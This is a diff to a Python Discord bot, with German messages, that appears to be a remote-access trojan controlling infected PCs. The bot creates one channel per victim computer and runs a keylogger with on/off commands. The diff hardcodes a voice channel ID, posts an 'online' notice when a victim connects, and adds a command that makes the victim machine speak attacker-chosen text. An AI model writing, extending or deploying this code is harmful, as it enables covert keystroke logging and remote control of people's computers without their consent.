@@ -31,6 +31,7 @@ import uuid
 import logging
 import psutil
 import datetime
+from datetime import datetime
 import atexit
 import pyttsx3
 import pyaudio
@@ -159,9 +160,10 @@ async def on_ready():
         sanitized_name = sanitize_channel_name(computer_name)
         existing_channel = discord.utils.get(guild.channels, name=sanitized_name)
         if not existing_channel:
-            await guild.create_text_channel(sanitized_name)
+            channel = await guild.create_text_channel(sanitized_name)
             print(f'Channel "{sanitized_name}" wurde erstellt')
         else:
+            channel = existing_channel
             print(f'Channel "{sanitized_name}" existiert bereits')
             
         load_keylogger_status()  
@@ -172,7 +174,12 @@ async def on_ready():
         channel_ids['keylogger_channel'] = keylogger_channel.id
         print(f"Keylogger channel ID set to: {keylogger_channel.id}")
         
-        channel_ids['voice'] = YOUR_VOICE_CHANNEL_ID
+        channel_ids['voice'] = 1334502408780255253
+        
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        # Send a message indicating that the bot is online
+        await channel.send(f"Bot is now online! {current_time}")
+
     else:
         print('Guild nicht gefunden')
     load_admin_status()  # Laden des Admin-Status beim Start
@@ -859,6 +866,28 @@ async def keylog(ctx, action=None):
             print("Keylogger wurde deaktiviert.")
     else:
         await log_message(ctx, '❌ **Ungültige Aktion. Verwenden Sie `!keylog on` oder `!keylog off`.**', duration=10)
+        
+@bot.command()
+@commands.check(is_authorized)
+async def tts(ctx, *, message):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
+
+    try:
+        engine = pyttsx3.init()
+        engine.say(message)
+        engine.runAndWait()
+        await log_message(ctx, f'🔊 **Text-to-Speech Nachricht abgespielt:** {message}')
+    except Exception as e:
+        await log_message(ctx, f'❌ **Fehler beim Abspielen der Text-to-Speech Nachricht:** {str(e)}', duration=10)
+
+@tts.error
+async def tts_error(ctx, error):
+    if isinstance(error, MissingRequiredArgument):
+        await log_message(ctx, '❌ **Fehler:** Ein erforderliches Argument fehlt. Bitte geben Sie eine Nachricht an.', duration=10)
+    else:
+        await log_message(ctx, f'❌ **Fehler:** {str(error)}', duration=10)
 
 def main():
     time.sleep(15)
